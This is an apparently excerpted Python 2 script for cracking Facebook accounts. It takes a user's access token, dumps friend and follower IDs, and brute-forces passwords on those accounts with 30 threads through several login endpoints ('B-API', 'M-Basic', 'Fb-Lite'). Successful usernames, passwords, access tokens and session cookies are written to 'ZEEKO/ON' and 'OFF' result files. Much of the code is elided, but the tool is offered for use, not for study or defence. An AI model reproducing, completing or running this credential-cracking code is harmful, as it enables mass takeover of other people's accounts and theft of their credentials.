...
"""%s
 ...
 - whatsap     : 
 - github      : h
 - script name : Unknown (QiNgx ToOr AjMaLo)
 - version     : 1.1
...
def tik():
    titik = ['.   ','..  ','... ']
    for o in titik:
        print ('\r%s%s Paste Token %s'%(M,til,o)),
...
def masuk():
    ...
    rom = raw_input('\n%s [?] Menu : %s'%(P,K))
    if rom in(""):
    	print("%s [!] Brother Paste Token Again "%(M));exit()
    elif rom in ('1','01'):
        jalan("\n%s [%s!%s] We are trying to teach you about system"%(P,M,P))
    	romz = raw_input('%s [?] Token : %s'%(P,K))
        if romz in(""):
        	print("%s [!] Brother Paste Token Again "%(M));exit()
    	try:
            gas = requests.get('https://graph.facebook.com/me?access_token=%s'%(romz)).json()['name']
            print ('\n%s[√] Login Success, Enjoy '%(H));jeda(2)
...
def publik(romz,headers=header):
    ...
    try:
        ...
        bff.close()
        print ('\n\n %s[%s√%s] Succes Dump id %s%s'%(P,H,P,H,nm['name']))
        print ('%s [%s√%s] Dump File :%s %s '%(P,H,P,H,file))
        raw_input('\n%s [ %senter %s] '%(P,K,P))
        menu()
...
class ngentod:
    ...
    def romiy(self):
        ...
        unikers = raw_input('%s [?] Do you want to choose password manual? [y/t] :%s '%(P,K))
        if unikers in ('Y', 'y'):
                ...
                if pwx == '':
                    ...
                    def zona(zafi_=None): 
                        ...
                        if ind == '':
                            ...
                            print '\n %s[%s*%s] ZEEKO %sON %sResult save to >%s NAZIR/ON-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                            print '%s [%s*%s] ZEEKO %sOFF %sResult save to > %s NAZIR/OFF-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                            ...
                            print '\n %s[%s*%s] ZEEKO %sON%sResult save to >%s NAZIR/ON-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                            print '%s [%s*%s] ZEEKO %sOFF %sResult save to > %sNAZIR/OFF-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
                            with ThreadPoolExecutor(max_workers=30) as log:
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                            ...
                            print ('\n %s[!] Brother Try Again'%(M));zona()
                    print '\n%s [ Fill Methode Crack - silahkan coba satu² ]\n'%(P)
                    print ' [%s01%s] B-API Method (AJMALO-PRO)'%(K,P)
                    print ' [%s02%s] Method M-Basic (FAST CRACK)'%(K,P)
                    print ' [%s03%s] Method Fb-Lite (SLOW CRACK)'%(K,P)
                    zona(pwx.split(','))
                    break
        elif unikers in ('T', 't'):
            print '\n%s [ pilih methode crack - silahkan coba satu² ]\n'%(P)
            print ' [%s01%s] B-API Method (NAZIR-PRO)'%(K,P)
            print ' [%s02%s] Method M-Basic (FAST CRACK)'%(K,P)
            print ' [%s03%s] Methode Fb-Lite (SLOW CRACK)'%(K,P)
            self.langsung()
        else:
    ...
    def langsung(self):
        ...
        if suuu == '':
            ...
            print '\n %s[%s*%s] ZEEKO %sON%sResult save to >%s NAZIR/ON-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
            print '%s [%s*%s] ZEEKO %sOFF %sResult save to > %s NAZIT/OFF-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
            ...
            print '\n%s [%s*%s] ZEEKO %sON%sResult save to >%s NAZIR/ON-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
            print '%s [%s*%s] ZEEKO %sOFF %Result save to > %s NAZIR/OFF-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
            ...
            print("\n%s [!] Brother Paste Token Again "%(M));self.langsung()
    def b_api(self, user, zona):
        ...
        for pw in zona:
            ...
            if 'session_key' in response.text and 'EAAA' in response.text:
                print '\r %sZEEKO-OFF %s ◊ %s ◊ %s ' % (H,user,pw,response.json()['access_token'])
                ok.append('%s ◊ %s ◊ %s' % (user,pw,response.json()['access_token']))
                open('ZEEKO/OFF-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' *--> %s ◊ %s ◊ %s\n'%(user,pw,response.json()['access_token']))
                break
                continue
                ...
                try:
                    ...
                    month = bulan1[month]
                    print '\r %sZEEKO-OFF %s ◊ %s ◊ %s %s %s  ' % (K,user,pw,day,month,year)
                    cp.append("%s ◊ %s ◊ %s %s %s"% (user,pw,day,month,year))
                    open('ZEEKO/OFF-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s ◊ %s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                ...
                print '\r %sZEEKO-OFF %s ◊ %s           ' % (K,user,pw)
                cp.append('%s ◊ %s' % (user,pw))
                open('ZEEKO/OFF-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s\n"%(user,pw))
                break
                continue
        loop += 1
        rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        print('\r %sCracking %s/%s [ON-:%s]-[OFF-:%s]'%(rm,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
    def basic(self, user, zona):
        ...
        for pw in zona:
            ...
            if "c_user" in ses.cookies.get_dict().keys():
                ...
                print '\r %sZEEKO-OFF %s ◊ %s ◊ %s  ' % (H,user,pw,kuki)
...
# GANTI USER AGENT
def useragent():
	print ("\n%s [%s01%s] View user agents "%(P,K,P))
	print (" [%s02%s] Check user agents "%(K,P))
	print (" [%s00%s] Log out "%(M,P))
	uas()
def uas():
    u = raw_input('\n%s [?] pilih :%s '%(P,K))
    if u == '':
        print("%s [!] Brother Paste Token Again "%(M));jeda(2);uas()
    elif u in("1","01"):
...
def menu():
    ...
    print (' [%s05%s] Check user agent'%(K,P)) 
    print (' [%s06%s] Check crack result'%(K,P)) 
    #print (' [%s07%s] Gabung group'%(K,P))
    #print (' [%s08%s] Info script'%(K,P))
    print (' [%s00%s] Log out (Accesss token)'%(M,P))
    unik = raw_input('\n%s [?] Menu : %s'%(P,K))
    if unik == '':
        print("%s [!] Brother Paste Token Again "%(M));jeda(2);menu()
    elif unik in['1','01']:
        publik(romz)
    elif unik in['2','02']:
        followers(romz)
    	...
    	try:
            ...
            print("\n %s[%s!%s] cth : OFF-%s-%s-%s%s"%(P,M,P,ha,op,ta,".txt"))
